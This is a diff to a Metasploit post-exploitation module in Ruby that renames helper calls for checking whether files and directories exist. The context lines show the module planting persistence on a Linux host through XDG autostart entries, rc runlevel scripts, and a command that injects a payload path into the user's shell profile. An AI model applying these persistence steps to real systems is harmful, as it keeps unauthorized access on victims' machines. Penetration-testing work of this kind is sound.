@@ -94,7 +94,7 @@ class Metasploit3 < Msf::Post
 		unless datastore['REXEPATH'].nil? or datastore['REXEPATH'].empty?
 			@use_home_dir = false;
 			rexepath = ::File.expand_path(datastore['REXEPATH'])
-			if not dir_exists? rexepath
+			if not directory_exist? rexepath
 				print_error("The directory #{datastore['REXEPATH']} does not exists on the remote system")
 				return
 			end
@@ -230,7 +230,7 @@ class Metasploit3 < Msf::Post
 			# If $XDG_CONFIG_HOME and $XDG_CONFIG_DIRS are not set and the two files /etc/xdg/autostart/foo.desktop and ~/.config/autostart/foo.desktop exist then only the 			# file ~/.config/autostart/foo.desktop will be used because ~/.config/autostart/ is more important than /etc/xdg/autostart/ 
 			if @is_root
 				autostart_path = '/etc/xdg/autostart/'
-				unless dir_exists? autostart_path
+				unless directory_exist? autostart_path
 					print_error("xdg path do not exists : #{autostart_path}")
 					return false
 				end
@@ -245,7 +245,7 @@ class Metasploit3 < Msf::Post
 			else
 				autostart_path = ::File.join(@homedir, '.config', 'autostart')
 				#some distribution like OEL do not create it by default
-				unless dir_exists? autostart_path
+				unless directory_exist? autostart_path
 					cmd_exec('mkdir -p ' + autostart_path)
 				end
 			end
@@ -269,7 +269,7 @@ class Metasploit3 < Msf::Post
 			end
 			runlevel = cmd_exec('runlevel').scan(/[0-9]*$/)[0].gsub("\n", '')
 			rc_dir = "/etc/rc#{runlevel}.d"
-			unless dir_exists? rc_dir
+			unless directory_exist? rc_dir
 				print_error("The rc directory does not exists : #{rc_dir}")
 			end
 			rc_temp = '/etc/rc.local' + ::Rex::Text.rand_text_alpha((rand(4)+6))
@@ -306,7 +306,7 @@ class Metasploit3 < Msf::Post
 				print_error("This shell has not been tested with this module")
 				profile_file = ::File.join(@homedir, '.profile')
 			end
-			if file_exists? profile_file
+			if file_exist? profile_file
 				cmd = 'cat ' + profile_file + ' | { echo "' + path_for_file + '&"; cat; } | cat > ' + profile_file_temp
 				cmd_exec(cmd)
 				cmd_exec('mv ' + profile_file_temp + ' ' + profile_file)
